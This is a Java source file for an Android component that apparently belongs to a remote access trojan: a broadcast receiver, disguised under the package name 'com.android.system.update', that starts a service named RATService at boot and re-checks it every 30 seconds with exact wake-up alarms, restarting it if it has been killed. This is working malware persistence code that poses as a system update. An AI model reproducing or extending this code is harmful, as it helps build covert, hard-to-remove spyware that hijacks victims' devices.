package com.android.system.update;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

public class RestartReceiver extends BroadcastReceiver {
    private static final String TAG = "RestartReceiver";
    
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent == null || intent.getAction() == null) {
            return;
        }
        
        Log.d(TAG, "Received action: " + intent.getAction());
        
        if ("CHECK_SERVICE".equals(intent.getAction())) {
            // Check if service is running and restart if needed
            checkAndRestartService(context);
        } else if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
            // Start on boot
            Log.d(TAG, "Boot completed detected, starting service");
            startService(context);
            
            // Also schedule periodic checks after boot
            scheduleNextCheck(context);
        } else if ("ALARM_RESTART".equals(intent.getAction())) {
            // Direct restart alarm
            Log.d(TAG, "Alarm restart triggered");
            startService(context);
        }
    }
    
    private void checkAndRestartService(Context context) {
        // First, check if service is actually running
        boolean isRunning = isServiceRunning(context, RATService.class);
        
        if (!isRunning) {
            Log.w(TAG, "Service not running, attempting restart");
            startService(context);
        } else {
            Log.d(TAG, "Service is already running");
        }
        
        // Always schedule next check (creates a continuous loop)
        scheduleNextCheck(context);
    }
    
    private boolean isServiceRunning(Context context, Class<?> serviceClass) {
        android.app.ActivityManager manager = 
            (android.app.ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        
        for (android.app.ActivityManager.RunningServiceInfo service : 
                manager.getRunningServices(Integer.MAX_VALUE)) {
            if (serviceClass.getName().equals(service.service.getClassName())) {
                return true;
            }
        }
        return false;
    }
    
    private void startService(Context context) {
        try {
            Intent serviceIntent = new Intent(context, RATService.class);
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
                Log.d(TAG, "Foreground service start requested (Android O+)");
            } else {
                context.startService(serviceIntent);
                Log.d(TAG, "Service start requested (pre-Android O)");
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to start service: " + e.getMessage());
            
            // If start failed, try with direct intent flags
            try {
                Intent fallbackIntent = new Intent(context, RATService.class);
                fallbackIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(fallbackIntent);
                Log.d(TAG, "Started via fallback activity");
            } catch (Exception e2) {
                Log.e(TAG, "Fallback also failed: " + e2.getMessage());
            }
        }
    }
    
    private void scheduleNextCheck(Context context) {
        try {
            Intent intent = new Intent(context, RestartReceiver.class);
            intent.setAction("CHECK_SERVICE");
            
            android.app.AlarmManager alarmManager = 
                (android.app.AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
            
            android.app.PendingIntent pendingIntent = 
                android.app.PendingIntent.getBroadcast(
                    context, 
                    1001, // Unique request code
                    intent,
                    android.app.PendingIntent.FLAG_UPDATE_CURRENT | 
                    android.app.PendingIntent.FLAG_IMMUTABLE
                );
            
            if (alarmManager != null) {
                long nextCheck = System.currentTimeMillis() + 30000; // 30 seconds
                
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    alarmManager.setExactAndAllowWhileIdle(
                        android.app.AlarmManager.RTC_WAKEUP,
                        nextCheck,
                        pendingIntent
                    );
                    Log.d(TAG, "Next check scheduled in 30 seconds (exact + allow while idle)");
                } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                    alarmManager.setExact(
                        android.app.AlarmManager.RTC_WAKEUP,
                        nextCheck,
                        pendingIntent
                    );
                    Log.d(TAG, "Next check scheduled in 30 seconds (exact)");
                } else {
                    alarmManager.set(
                        android.app.AlarmManager.RTC_WAKEUP,
                        nextCheck,
                        pendingIntent
                    );
                    Log.d(TAG, "Next check scheduled in 30 seconds (legacy)");
                }
            }
        } catch (SecurityException e) {
            Log.e(TAG, "Schedule failed - missing alarm permission: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "Failed to schedule next check: " + e.getMessage());
        }
    }
}
